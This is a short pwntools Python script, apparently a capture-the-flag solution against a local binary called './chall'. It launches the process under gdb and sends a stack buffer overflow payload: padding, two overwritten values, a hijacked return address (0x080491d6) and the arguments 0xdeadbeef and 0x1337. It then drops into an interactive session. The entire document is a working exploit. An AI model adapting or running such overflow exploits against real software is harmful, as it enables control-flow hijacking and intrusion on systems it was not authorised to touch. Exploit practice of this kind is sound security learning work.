from pwn import *

OFFSET = 36

elf = ELF("./chall")

io = elf.process()
gdb.attach(io)

payload = b"A"* 32 + p32(0x1f4) +  p32(0x190) + b"A" * 12 + p32(0x080491d6) + b"A"*4 + p32(0xdeadbeef) + p32(0x1337)

io.sendline(payload)

io.interactive()
